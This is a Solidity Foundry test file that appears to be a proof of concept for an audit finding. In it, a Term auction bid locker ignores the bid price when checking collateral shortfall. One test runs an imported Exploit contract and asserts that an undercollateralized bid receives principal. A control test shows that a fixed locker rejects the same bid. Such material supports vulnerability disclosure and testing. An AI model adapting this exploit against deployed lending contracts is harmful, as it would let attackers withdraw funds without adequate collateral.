// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Erc20,
    TermPriceOracle,
    TermAuctionBidLockerFixed
} from "./26301-bid-price-not-accounted-for-in-isininitialcollateralshortfa.sol";

contract PoC_26301_BidPriceIgnored is Test {
    uint256 internal constant BID = 1000 ether;
    uint256 internal constant PRICE = 2 ether;
    uint256 internal constant COLLATERAL = 1000 ether;

    function test_undercollateralized_bid_receives_principal() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.purchase().balanceOf(address(exp)), BID, "principal released");
        assertEq(exp.locker().released(), BID, "released");
        assertTrue(exp.locker().acceptedBid(), "accepted");
        assertEq(BID * PRICE / 1e18 - COLLATERAL, 1000 ether, "1000 short");
    }

    function test_control_priced_repurchase_rejects_bid() public {
        Erc20 collateral = new Erc20("COLL");
        Erc20 purchase = new Erc20("PURCHASE");
        TermPriceOracle oracle = new TermPriceOracle();
        TermAuctionBidLockerFixed locker = new TermAuctionBidLockerFixed(oracle, address(purchase), address(collateral));
        purchase.mint(address(locker), BID);
        collateral.mint(address(this), COLLATERAL);
        collateral.approve(address(locker), COLLATERAL);

        bool accepted = locker.lockBid(BID, PRICE, COLLATERAL);

        assertFalse(accepted, "bid must be rejected");
        assertEq(purchase.balanceOf(address(this)), 0, "no principal");
        assertEq(purchase.balanceOf(address(locker)), BID, "principal stays");
        assertEq(collateral.balanceOf(address(this)), COLLATERAL, "collateral refunded");
    }
}
